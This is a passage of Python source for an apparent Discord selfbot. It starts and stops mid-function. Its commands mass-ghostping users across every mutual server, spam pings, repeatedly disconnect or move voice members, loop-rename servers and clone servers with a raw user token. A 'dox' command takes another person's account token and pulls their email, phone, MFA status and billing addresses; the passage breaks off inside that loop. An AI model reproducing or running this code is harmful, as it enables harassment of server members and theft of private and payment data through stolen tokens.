            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


            
        except Exception:
            pass

    @React.command(usage="globalmassghostping <User>", description="Ghostpings a person in every channel in every mutual server")
    async def globalmassghostping(ctx, user: discord.User):
        try:

            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Global mass ghostping',timestamp=embed_timestamp())
            embed.add_field(name=f'__üî¥ Mass Ghostpinging__', value=f'{user.mention}', inline=True)
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)



            profile = await user.profile()

            for g in profile.mutual_guilds:
                le_tasks = [send_ghostping(channel, user) for channel in g.channels]
                await asyncio.wait(le_tasks)
            
        except Exception:
            pass

    
    @React.command(usage="vcdisconnectall <Voice Channel>", description="Disconnects all clients from a voice channel")
    async def vcdisconnectall(ctx, voice_channel: discord.VoiceChannel):
        try:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Voice disconnect all',timestamp=embed_timestamp())
            embed.add_field(name=f'__‚õî Disconnecting all from VoiceChannel__', value=f'{voice_channel.mention}', inline=True)
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


            le_task = [client.edit(voice_channel=None) for client in voice_channel.members]
            await asyncio.wait(le_task)
        except Exception:
            pass

    @React.command(usage="vcdisconnect <Member>", description="Disconnects a client from a voice channel")
    async def vcdisconnect(ctx, member: discord.Member):
        try:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Voice disconnect',timestamp=embed_timestamp())
            embed.add_field(name=f'__‚õî Disconnecting Member__', value=f'{member.mention}', inline=True)
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


            await member.edit(voice_channel=None)
        except Exception:
            pass

    @React.command(usage="nick <Member> <Nickname>", description="Set a nickname")
    async def nick(ctx, member: discord.Member, *, name: str):
        try:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Nick',timestamp=embed_timestamp())
            embed.add_field(name=f'__üßë Member__', value=f'{member.mention}', inline=False)
            embed.add_field(name=f'__üìõ Nickname__', value=f'{name}', inline=False)
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


            await member.edit(nick=name)
        except Exception:
            pass

    @React.command(usage="loopservername <Text>", description="Loop server name")
    async def loopservername(ctx, *, text):
        try:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Server Name Loop',timestamp=embed_timestamp())
            embed.add_field(name=f'__üìõ Name__', value=f'{text}', inline=False)
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


            text = text.split(' ')
            global serveranimating
            serveranimating = True
            while serveranimating:
                name = ""
                for word in text:
                    name = name + word + " "
                    await ctx.guild.edit(name=name)
                    await asyncio.sleep(1)
        except Exception:
            pass

    @React.command(usage="stoploopservername", description="Stop looping server name")
    async def stoploopservername(ctx):
        try:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Server Name Loop', description='Stopped server name animation.', timestamp=embed_timestamp())
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


            global serveranimating
            serveranimating = False
        except Exception:
            pass

    @React.command(usage="animatenick <Text>", description="Animated nickname")
    async def animatenick(ctx, *, text):
        try:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Animate Nick',timestamp=embed_timestamp())
            embed.add_field(name=f'__üìõ Nickname__', value=f'{text}', inline=False)
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


            global animating
            animating = True
            while animating:
                name = ""
                for letter in text:
                    name = name + letter
                    await ctx.message.author.edit(nick=name)
        except Exception:
            pass

    @React.command(usage="stopanimatenick", description="Stop annimated nickname")
    async def stopanimatenick(ctx):
        try:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Animate Nick', description='Stopped nickname animation.', timestamp=embed_timestamp())
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


            global animating
            animating = False
        except Exception:
            pass

    @React.command(usage="vcmoveto <Member> <Voice Channel>", description="Moves a user to a voice channel")
    async def vcmoveto(ctx, member: discord.Member, voice_channel: discord.VoiceChannel):
        try:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Voice move to',timestamp=embed_timestamp())
            embed.add_field(name=f'__üßë Member__', value=f'{member.mention}', inline=False)
            embed.add_field(name=f'__üé§ Channel__', value=f'{voice_channel.mention}', inline=False)
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


            await member.edit(voice_channel=voice_channel)
        except Exception:
            pass

    @React.command(usage="vcdeafen <Member>", description="Deafens a member")
    async def vcdeafen(ctx, member: discord.Member):
        try:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Voice Deafen',timestamp=embed_timestamp())
            embed.add_field(name=f'__‚õî Deafening Member__', value=f'{member.mention}', inline=True)
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


            await member.edit(deafen = True)
        except Exception:
            pass

    @React.command(usage="vcundeafen <Member>", description="Undeafens a member")
    async def vcundeafen(ctx, member: discord.Member):
        try:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Voice Undeafen',timestamp=embed_timestamp())
            embed.add_field(name=f'__‚õî Undeafening Member__', value=f'{member.mention}', inline=True)
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


            await member.edit(deafen = False)
        except Exception:
            pass

    @React.command(usage="vcmute <Member>", description="Mutes a member")
    async def vcmute(ctx, member: discord.Member):
        try:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Voice Mute',timestamp=embed_timestamp())
            embed.add_field(name=f'__‚õî Muting Member__', value=f'{member.mention}', inline=True)
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


            await member.edit(mute = True)
        except Exception:
            pass

    @React.command(usage="vcunmute <Member>", description="Unmutes a member")
    async def vcunmute(ctx, member: discord.Member):
        try:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Voice Unmute',timestamp=embed_timestamp())
            embed.add_field(name=f'__‚õî Unmuting Member__', value=f'{member.mention}', inline=True)
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


            await member.edit(mute = False)
        except Exception:
            pass

    @React.command(usage="vcmovespam <Amount>", description="Moves all clients a specific amount of times to random channels")
    async def vcmovespam(ctx, amount: int):
        try:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Voice move spam', description='Moving all members in voice to random channels', timestamp=embed_timestamp())
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)



            clients = []

            for channel in ctx.guild.voice_channels:
                for member in channel.members:
                    clients.append(member)

            for _i in range(0, amount):
                try:
                    le_task = [client.edit(voice_channel=random.choice(ctx.guild.voice_channels)) for client in clients]
                    await asyncio.wait(le_task)
                except:
                    pass
            
        except Exception:
            pass
        
    @React.command(usage="massping", description="Pings as many people as possible")
    async def massping(ctx):
        try:
            members = ctx.channel.members
            
            await ctx.send(" ".join([member.mention for member in members[:40]]))
        except Exception:
            pass
        
    @React.command(usage="massgping", description="Mass ghostpings")
    async def massgping(ctx):
        try:
            members = sctx.channel.members
            
            le_msg = await ctx.send(" ".join([member.mention for member in members[:40]]))
            await le_msg.delete()
        except Exception:
            pass
        
                
    @React.command(usage="cloneserver [Server ID]", description="Creates a server with the same channels and roles")
    async def cloneserver(ctx, server_id: int=None):
        
        if server_id is None:
            server = ctx.guild
        else: 
            server = discord.utils.get(ctx.bot.guilds, id=server_id)
        channels = server.channels
        roles = server.roles
        try:
            async with httpx.AsyncClient() as client:
                originguild = ctx.guild
                result = await client.post('https://canary.discordapp.com/api/v8/guilds', json={'name': f'{originguild.name} clone', 'guild_template_code': '2TffvPucqHkN'}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                cloneserverid = result.json()['id']
        except Exception:
            pass
        
        defaultchannels = requests.get(f'https://canary.discordapp.com/api/v8/guilds/{cloneserverid}/channels', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'}).json()
        
        for defaultchannel in defaultchannels:
            try:
                defaultchannel_id = defaultchannel['id']
                requests.delete(f'https://canary.discordapp.com/api/v8/channels/{defaultchannel_id}', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
            except Exception:
                pass
        
        for channel in channels:
            try:
                if channel.type == discord.ChannelType.category:
                    category = requests.post(f'https://canary.discordapp.com/api/v8/guilds/{cloneserverid}/channels', json={'name': channel.name, 'permission_overwrites': [], 'type': 4}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                    categoryid = category.json()['id']
                    subchannels = channel.channels
                    for subchannel in subchannels:
                        if subchannel.type == discord.ChannelType.text:
                            requests.post(f'https://canary.discordapp.com/api/v8/guilds/{cloneserverid}/channels', json={'name': subchannel.name, 'permission_overwrites': [], 'type': 0, 'parent_id': f'{categoryid}'}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                        elif subchannel.type == discord.ChannelType.voice:
                            requests.post(f'https://canary.discordapp.com/api/v8/guilds/{cloneserverid}/channels', json={'name': subchannel.name, 'permission_overwrites': [], 'type': 2, 'parent_id': f'{categoryid}'}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                
                
                if channel.type == discord.ChannelType.text and channel.category_id == None:
                    requests.post(f'https://canary.discordapp.com/api/v8/guilds/{cloneserverid}/channels', json={'name': channel.name, 'permission_overwrites': [], 'type': 0}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                elif channel.type == discord.ChannelType.voice and channel.category_id == None:
                    requests.post(f'https://canary.discordapp.com/api/v8/guilds/{cloneserverid}/channels', json={'name': channel.name, 'permission_overwrites': [], 'type': 2}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
            except Exception:
                pass
            
        for role in reversed(roles):
            try:
                if role.name != '@everyone':
                    role_color = int(f"{role.color}".replace("#", "0x"), 0)
                    requests.post(f'https://canary.discordapp.com/api/v8/guilds/{cloneserverid}/roles', json={'name': role.name, 'color': role_color}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
            except Exception:
                pass
            
    @React.command(usage="cloneservertoserver <ToServerID> <FromServerID>", description="Clones a server to an existing one")
    async def cloneservertoserver(ctx, old_server_id: int, server_id: int=None):
        
        if server_id is None:
            server = ctx.guild
        else: 
            server = discord.utils.get(ctx.bot.guilds, id=server_id)
        channels = server.channels
        roles = server.roles
        
        cloneserverid = old_server_id
        
        defaultchannels = requests.get(f'https://canary.discordapp.com/api/v8/guilds/{cloneserverid}/channels', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'}).json()
        
        for defaultchannel in defaultchannels:
            try:
                defaultchannel_id = defaultchannel['id']
                requests.delete(f'https://canary.discordapp.com/api/v8/channels/{defaultchannel_id}', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
            except Exception:
                pass
        
        for channel in channels:
            try:
                if channel.type == discord.ChannelType.category:
                    category = requests.post(f'https://canary.discordapp.com/api/v8/guilds/{cloneserverid}/channels', json={'name': channel.name, 'permission_overwrites': [], 'type': 4}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                    categoryid = category.json()['id']
                    subchannels = channel.channels
                    for subchannel in subchannels:
                        if subchannel.type == discord.ChannelType.text:
                            requests.post(f'https://canary.discordapp.com/api/v8/guilds/{cloneserverid}/channels', json={'name': subchannel.name, 'permission_overwrites': [], 'type': 0, 'parent_id': f'{categoryid}'}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                        elif subchannel.type == discord.ChannelType.voice:
                            requests.post(f'https://canary.discordapp.com/api/v8/guilds/{cloneserverid}/channels', json={'name': subchannel.name, 'permission_overwrites': [], 'type': 2, 'parent_id': f'{categoryid}'}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                
                
                if channel.type == discord.ChannelType.text and channel.category_id == None:
                    requests.post(f'https://canary.discordapp.com/api/v8/guilds/{cloneserverid}/channels', json={'name': channel.name, 'permission_overwrites': [], 'type': 0}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                elif channel.type == discord.ChannelType.voice and channel.category_id == None:
                    requests.post(f'https://canary.discordapp.com/api/v8/guilds/{cloneserverid}/channels', json={'name': channel.name, 'permission_overwrites': [], 'type': 2}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
            except Exception:
                pass
            
        for role in reversed(roles):
            try:
                if role.name != '@everyone':
                    role_color = int(f"{role.color}".replace("#", "0x"), 0)
                    requests.post(f'https://canary.discordapp.com/api/v8/guilds/{cloneserverid}/roles', json={'name': role.name, 'color': role_color}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
            except Exception:
                pass

    @React.command(usage="dox <Token>", description="Shows information about someones Discord Account")
    async def dox(ctx, token: str):
        
        try:
            async with httpx.AsyncClient() as client:
                userinfo = await client.get('https://canary.discordapp.com/api/v8/users/@me', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                userdata = json.loads(userinfo.content)
                try:
                    userdata['premium_type']
                except Exception:
                    dnitro ="None"
                else:
                    if userdata['premium_type'] == 1:
                        dnitro ="Nitro Classic"

                    elif userdata['premium_type'] == 2:
                        dnitro ="Nitro"

                username = userdata['username']
                discriminator = userdata['discriminator']
                user_id = userdata['id']
                avatar_url = f"https://cdn.discordapp.com/avatars/{userdata['id']}/{userdata['avatar']}"
                email = userdata['email']
                phone = userdata['phone']
                verified = userdata['verified']
                locale = userdata['locale']
                mfa = userdata['mfa_enabled']
                nsfw = userdata['nsfw_allowed']
                creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')

                billing_info = []

                cc_digits = {
                    'american express': '3',
                    'visa': '4',
                    'mastercard': '5'
                }

                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='User Information',timestamp=embed_timestamp())
                embed.add_field(name=f'Username', value=f'{username}#{discriminator}', inline=False)
                embed.add_field(name=f'Email', value=email, inline=False)
                embed.add_field(name=f'User ID', value=user_id, inline=False)
                embed.add_field(name=f'Phone', value=phone, inline=False)
                embed.add_field(name=f'Creation Date', value=creation_date, inline=False)
                embed.add_field(name=f'Nitro', value=dnitro, inline=False)
                embed.add_field(name=f'Verified', value=verified, inline=False)
                embed.add_field(name=f'Locale', value=locale, inline=False)
                embed.add_field(name=f'MFA Enabled', value=mfa, inline=False)
                embed.add_field(name=f'NSFW Allowed', value=nsfw, inline=False)

                for x in requests.get('https://canary.discordapp.com/api/v8/users/@me/billing/payment-sources', headers={'authorization': token, 'Content-Type': 'application/json'}).json():
                    y = x['billing_address']
                    name = y['name']
                    address_1 = y['line_1']
                    address_2 = y['line_2']
                    city = y['city']
                    postal_code = y['postal_code']
                    state = y['state']
                    country = y['country']

